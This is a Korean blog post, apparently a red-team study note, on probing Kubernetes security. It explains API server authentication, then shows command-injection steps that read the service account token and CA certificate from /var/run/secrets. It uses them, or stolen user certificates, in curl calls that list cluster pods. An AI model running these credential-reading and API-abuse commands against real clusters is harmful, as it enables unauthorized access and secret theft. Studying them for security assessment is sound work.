---
title: "[K8S] Security"
# author: wrkholic84
date: 2024-02-08 00:06:00 +0900
categories: [Development, Kubernetes]
tags: [kubernetes, security]
math: true
mermaid: true
# image:
#   path: /commons/devices-mockup.png
#   width: 800
#   height: 500
#   alt: Responsive rendering of Chirpy theme on multiple devices.
---

# Kubernetes for RedTeam
Kubernetes에 대한 경험과 이해가 다르고,
보안 취약점 점검 시 관련 내용에 대한 접근이 어려운 이유로,
kubernetes 취약점 발견과 연구를 충분히 수행하기에 어려움이 있음  
이를 위해, 다음 과정을 통해 kubernetes에 대한 정리와 점검 방법에 대한 평준화를 이루고자 함

## Prerequisite Knowledge
### 1.Abstract Concept
![00](/assets/images/posts/20221226Security/00.png)
일반적으로 Kubernets 환경에 구축된 서비스는 위 그림과 같이 Apiserver와 Service 두 개의 접근 경로를 가짐.  
- Apiserver는 kubernetes 환경 전체를 제어
- Service(kuberntes resource)는 웹서비스를 인터넷과 연결해주는 역할 및 파드간 통신에 사용

우리의 목표는 이 두 가지 경로를 통해 취약점을 찾고, 안전한 서비스를 만드는 것.

### 2.ApiServer
**Apiserver**는 kubernetes 자체라고 봐도 무방함. api를 호출하는 방식으로 권한에 따라 kubernetes 전체 환경을 제어할 수 있음. 성공적인 api 호출은 인증 > 권한 > Admission Control 3단계를 모두 통과해야 함.

- Admission Control : 리소스 사용 제한 등  

RBAC이라고 하는 인증 (사용자, 서비스)에 권한(역할)이 부여되는 구조로, 인증 정보를 얻으면 인증에 해당하는 권한을 행사할 수 있음. 권한 및 Admission Control 관리를 위한 별도의 권한(관리자) 및 과정 필요.  

따라서 우리가 접근하여 활용할 수 있는 부분은 **인증**에 한정됨. 

Kubernetes의 인증은 다른 시스템과 마찬가지로 **사용자 인증**과 **서비스 인증**으로 나뉨. 이 두 가지 중 한 가지로 Apiserver를 호출 할 수 있음. 

- 사용자 인증 정보는 운영 환경이나 서비스 환경에 <U>인증서</U> 형태로 존재.  
- 서비스 인증 정보는 애플리케이션(컨테이너) 내 <U>토큰</U> 형태로 존재.

둘 중 하나의 정보를 얻기 위해 노력해야 함.

### 3.Pod Design Pattern
Pod는 Kubernetes에 의해 관리되는 애플리케이션의 최소 단위이며, 여러 컨테이너들의 집합.  
다음과 같은 패턴을 가짐.
![01](/assets/images/posts/20221226Security/01.png)
굳이 패턴 이야기를 하는 이유는 우리가 Command Injection이나 SSRF등의 애플리케이션 취약점을 이용해 접근할 수 있는 자원에 대한 이해를 높이기 위함임.

- Sidecar : Metric, Log 등을 위한 용도로 많이 쓰임. Istio가 대표적. 파일 시스템을 공유하고 있는 부분이 공략 포인트.
- Adapter : 애플리케이션의 출력 포멧을 통일 시키는 용도로 쓰임. 몰라도 됨.
- Ambassador : localhost를 목적지로 통신하는 애플리케이션을 쉽게 배포할 때 쓰임. 예를 들어, 애플리케이션이 localhost:3306(MySQL)과 통신한다면, Ambassador 컨테이너는 이 요청을 받아 필요한 목적지로 연결해줌. SSRF 시 고려해볼 수 있음.

### 4.Container
Pod 안에 정의되며, 다음과 같은 다양한 자원들을 정의하여 사용 가능.
- ServiceAccount : Pod가 ApiServer와 상호 작용할 수 있도록 권한을 부여해 놓은 자격 증명
- Secret : 암호, 토큰 또는 키와 같은 소량의 중요한 데이터를 포함하는 오브젝트
- ConfigMap : Key - Value 값 쌍으로 기밀이 아닌 데이터를 저장하는 데 사용하는 API 오브젝트
- Volume : 영구적으로 사용 가능한 Pod 외 지정된 별도 저장소

취약점 점검을 하다보면 애플리케이션 서버의 쉘을 획득할 수 있는 때가 있는데, 이 때, 이 정보들을 확인할 필요가 있고, 이 정보를 통해 추가 보안 취약점을 찾을 수 있음.

## 2.Call ApiServer
Apiserver에 접근할 수 있는 경로는 두 가지임. 인터넷 또는 Data Plane. 호출 가능한 곳에서 호출하면 되고, 아래 설명은 한 가지씩 나누어 호출해보는 것으로 설명.
### 1.with User Certificate (from Internet)
취약점 등을 통해 사용자 인증서와 키를 얻었다면 apiserver를 호출 할 수 있음
```bash
ubuntu@mypc:~$ curl -k --cert ./user.crt --key ./user.key https:/kubernetes:6443/api
{
  "kind": "APIVersions",
  "versions": [
    "v1"
  ],
  "serverAddressByClientCIDRs": [
    {
      "clientCIDR": "0.0.0.0/0",
      "serverAddress": "x.x.x.x:6443"
    }
  ]
}
```
사용자 인증서와 키는 base64로 인코딩되어 있을 수도 있음
```bash
ubuntu@mypc:~$ cat ./user.crt | base64 | tr -d "\n" 
LS0tLS1C...
ubuntu@mypc:~$ cat "LS0tLS1C..." | base64 -d
-----BEGIN CERTIFICATE-----
MIIDTzCCAjegAwIBAgIQYPmmYnZ...
-----END CERTIFICATE-----
```
### 2.with ServiceAccount Token (in Containers)
Command Injection 등을 통해 컨테이너 내부에 명령 실행을 할 수 있다면,
#### 2.1.get Kubernetes Information from env
```bash
Command Injection : env | grep -i kubernetes
KUBERNETES_PORT_443_TCP_PORT=443
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_PORT=tcp://10.96.0.1:443
KUBERNETES_SERVICE_HOST=10.96.0.1
KUBERNETES_SERVICE_PORT=443
KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
KUBERNETES_PORT_443_TCP_PROTO=tcp
```
#### 2.2.get Kubernetes Information from nslookup
```bash
Command Injection : nslookup kubernetes.default.svc
Server:		10.96.0.10
Address:	10.96.0.10#53

Name:	kubernetes.default.svc.cluster.local
Address: 10.96.0.1
```
#### 2.3.get Kubernetes Information from ServiceAccount
```bash
Command Injection : cat /var/run/secrets/kubernetes.io/serviceaccount/token
eyJhbGciOiJSUz ...
Command Injection : cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
hack8s
Command Injection : cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
-----BEGIN CERTIFICATE-----
MIIDB ...
```
안되는 명령들이 있을 수 있지만, token만 확인이 된다면, 아래 명령을 통해 apiserver를 호출해 볼 수 있음.
```bash
Command Injection : cat /var/run/secrets/kubernetes.io/serviceaccount/token
eyJhbGciOiJSUzI...
Command Injection : curl --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt --header "Authorization: Bearer eyJhbGciOiJSUzI..." -X GET https://kubernetes:6443/api/v1/namespaces/hack8s/pods
{
  "kind": "PodList",
  "apiVersion": "v1",
  "metadata": {
    "resourceVersion": "266526"
  },
  "items": [
    {
      "metadata": {
        "name": "busybox",
        ...
      }
    }
  ]
}
```

## 3.SSRF
Kubernetes HelmChart를 획득했다면, 다음 시도를 해보는 것도 도움이 될 수 있음
애플리케이션 취약점 분석을 위해 개발자 도구를 활용하듯, Kubernetes 취약점 분석을 위해 CD(Continuous Delivery) 툴을 활용해보자.
### 3.1.ArgoCD
작성중

